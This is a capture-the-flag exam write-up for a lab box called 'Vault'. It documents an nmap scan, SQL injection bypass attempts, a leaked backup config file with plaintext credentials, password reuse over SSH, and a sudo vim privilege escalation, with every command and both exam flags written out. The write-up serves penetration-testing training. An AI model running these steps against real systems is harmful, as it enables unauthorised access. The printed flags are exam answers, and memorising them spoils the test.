---
doc_kind: writeup
title: "ThunderCipher TC-VAPT Exam#1 — Vault"
category: web
slug: thundercipher-tcvapt-vault
created: 2026-11-09
status: solved
tags:
  - directory-listing
  - backup-file-leak
  - password-reuse
  - gtfobins
  - sudo-vim
source: "ThunderCipher (thundercipher.in) — TC-VAPT Exam #1"
target: "http://192.168.5.249/ (Vault, SSH+HTTP, VPN lab)"
---
# ThunderCipher TC-VAPT Exam#1 — Vault

## Challenge Summary

- Source: ThunderCipher (thundercipher.in) — TC-VAPT Exam #1 (paid practical exam, 12h lab timer)
- Target: http://192.168.5.249/ (Vault, SSH+HTTP only, reachable via exam OpenVPN)
- Goal: initial access + root, capture user.txt + root.txt (format `ThunderCipher{...}`)
- Prompt hint: "internal vault system believed secure... recent audits suggest possible exposure of
  sensitive configuration data" — pointed straight at a config/backup leak, not SQLi.

## Initial Signals

- Entry point: PHP login portal (`username`/`password` form, PHPSESSID cookie), Apache/2.4.63 Ubuntu.
- Visible hints: prompt text explicitly mentions "configuration data" exposure.
- First confirming probe: SQLi bypass payloads on the login form all failed identically (parameterized
  queries) — ruled out SQLi quickly instead of over-investing in it.

## Exploit Chain

1. `nmap -p1-1000` → only 22/ssh + 80/http open.
2. SQLi bypass attempts on login form (`' OR 1=1-- -` etc.) — all returned identical "Invalid username or
   password", response length nearly unchanged → not exploitable, moved on.
3. Targeted probing of backup/config paths found `/backup/` returning 301 (dir exists).
4. `GET /backup/` → Apache directory listing enabled, lists `config.php.bak`.
5. `GET /backup/config.php.bak` → plaintext `$db_user="admin"; $db_pass="SuperSecure123";`.
6. Tried those creds on the web login (`POST /` → 302 to /index.php, success) **and** on SSH as the same
   username — both worked (password reuse between app and OS account).
7. SSH as `admin` → `cat ~/user.txt` → user flag.
8. `sudo -l` → `(ALL) NOPASSWD: /usr/bin/vim` → GTFOBins vim escape:
   `sudo vim -c ':!cat /root/root.txt' -c ':q!' -c ':q!'` → root flag.

## Key Evidence

- `curl -s http://192.168.5.249/backup/` → `<a href="config.php.bak">config.php.bak</a> ... 58` (dir listing).
- `curl -s http://192.168.5.249/backup/config.php.bak` → `$db_user = "admin"; $db_pass = "SuperSecure123";`
- `ssh admin@192.168.5.249` (password `SuperSecure123`) → `uid=1000(admin)` — confirms creds work for SSH too.
- `sudo -l` → `User admin may run the following commands on hodabalo207: (ALL) NOPASSWD: /usr/bin/vim`

## Dead Ends

- SQL injection on the login form — parameterized, no bypass found, abandoned after ~7 payloads (good
  evidence-first discipline: didn't sink more time once response diffs showed nothing).
- Generic config/env filename guessing (`.env`, `config.json`, `db.php`, etc.) — all 404 except `/backup`.

## Payloads And Commands

```bash
# directory probe that found the backup dir (part of a larger wordlist of common config paths)
for p in backup config .env config.php.bak; do
  curl -s -o /dev/null -w "%{http_code}  $p\n" "http://192.168.5.249/$p"
done

curl -s http://192.168.5.249/backup/config.php.bak

ssh admin@192.168.5.249   # password: SuperSecure123
sudo -l
sudo vim -c ':!cat /root/root.txt' -c ':q!' -c ':q!'
```

## Flag / Outcome

- User: `ThunderCipher{vault_user_9f3a7c2d8b1e_secureaccess}`
- Root: `ThunderCipher{vault_root_a81c92ff7e6d_fullcompromise}`
- Full chain solved end-to-end, no blockers.

## Reusable Lessons

- When a challenge prompt explicitly says "configuration exposure", deprioritize SQLi/auth-bypass guessing
  and go straight for backup/config file disclosure probes (`/backup/`, `.bak`, `.old`, `~`, directory
  listing checks) — the hint text is a strong signal, trust it.
- Always test leaked creds against SSH too, not just the web app — password reuse between app accounts and
  OS accounts is extremely common in these labs (recurred on UploadX as well, see
  [[thundercipher-tcvapt-uploadx]]).
- `sudo -l` should be the very first privesc check after any shell — NOPASSWD rules on editors
  (vim/nano/less/more) are an instant root via GTFOBins `:!` shell-out.

## Pattern Candidates

- Existing pattern to update: n/a (GTFOBins sudo/SUID escalation is well-known, not worth a new pattern
  file by itself)
- New pattern worth creating: see [[directory-listing-leaks-sensitive-files]] (covers this + UploadX +
  Phantom's related recon angle)
